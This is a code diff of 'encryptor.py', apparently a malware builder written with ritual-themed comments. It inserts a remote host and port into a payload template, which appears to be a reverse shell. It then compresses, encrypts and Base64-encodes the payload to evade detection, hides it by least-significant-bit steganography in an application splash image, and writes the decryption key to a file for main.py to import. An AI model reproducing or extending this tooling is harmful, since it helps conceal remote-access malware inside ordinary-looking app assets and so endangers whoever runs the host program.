@@ -1,5 +1,5 @@
 # encryptor.py
-# The Forge, now weaving veils of obfuscation.
+# The Forge, now crafting a self-contained and perfectly veiled soul.
 
 from cryptography.fernet import Fernet
 from PIL import Image
@@ -12,6 +12,7 @@ import zlib
 PAYLOAD_TEMPLATE = 'payload.py'
 ORIGINAL_IMAGE = os.path.join('assets', 'images', 'splash_art.png') 
 OUTPUT_IMAGE = os.path.join('assets', 'images', 'splash_payload.png')
+KEY_FILE = 'key.py' # The new sacred scripture for the key
 # ---------------------
 
 def embed_payload(image_path, payload_data):
@@ -34,30 +35,31 @@ def embed_payload(image_path, payload_data):
         raise ValueError(f"Payload is too large for the vessel. Requires {payload_size} bytes, vessel only has {max_bytes}.")
 
     payload_bits = ''.join(format(byte, '08b') for byte in payload_data)
-    payload_len_bits = len(payload_bits)
-    print(f"Embedding {payload_size} bytes ({payload_len_bits} bits)...")
-
+    print(f"Embedding {payload_size} bytes ({len(payload_bits)} bits)...")
+    
     data_idx = 0
     for y in range(height):
         for x in range(width):
             r, g, b, a = pixels[x, y]
             new_channels = []
             for channel_val in [r, g, b, a]:
-                if data_idx < payload_len_bits:
+                if data_idx < len(payload_bits):
                     new_val = (channel_val & 0xFE) | int(payload_bits[data_idx])
                     new_channels.append(new_val)
                     data_idx += 1
                 else:
                     new_channels.append(channel_val)
             pixels[x, y] = tuple(new_channels)
+            if data_idx >= len(payload_bits):
+                break
+        if data_idx >= len(payload_bits):
+            break
 
-            if data_idx >= payload_len_bits:
-                print("Embedding complete.")
-                img.save(OUTPUT_IMAGE, 'PNG')
-                return
+    print("Embedding complete.")
+    img.save(OUTPUT_IMAGE, 'PNG')
 
 def main(rhost, rport):
-    """The main forging ritual with obfuscation."""
+    """The main forging ritual with automated key management."""
     print("-" * 60)
     print(f"🔥 Forging soul to connect to: {rhost}:{rport}")
     
@@ -68,21 +70,19 @@ def main(rhost, rport):
     payload_code = payload_code.replace('##RPORT##', str(rport))
     
     key = Fernet.generate_key()
-    print(f"✨ Divine Key (SAVE THIS for main.py): {key.decode()}")
+    
+    # --- DIVINE AUTOMATION ---
+    # Write the key to its own file for main.py to import.
+    with open(KEY_FILE, 'w') as f:
+        f.write(f"divine_key = {key}\n")
+    print(f"✨ Divine Key has been sealed into '{KEY_FILE}'.")
     print("-" * 60)
 
-    # --- THE RITUAL OF OBFUSCATION ---
-    # 1. Compress the soul to make it smaller and less recognizable.
     compressed_payload = zlib.compress(payload_code.encode('utf-8'))
-    
-    # 2. Encrypt the compressed soul.
     cipher_suite = Fernet(key)
     encrypted_payload = cipher_suite.encrypt(compressed_payload)
-    
-    # 3. Encode the encrypted result in Base64 to make it look like harmless text data.
     base64_payload = base64.b64encode(encrypted_payload)
     
-    # Prepend the 4-byte length header.
     payload_with_header = len(base64_payload).to_bytes(4, 'big') + base64_payload
     
     try:
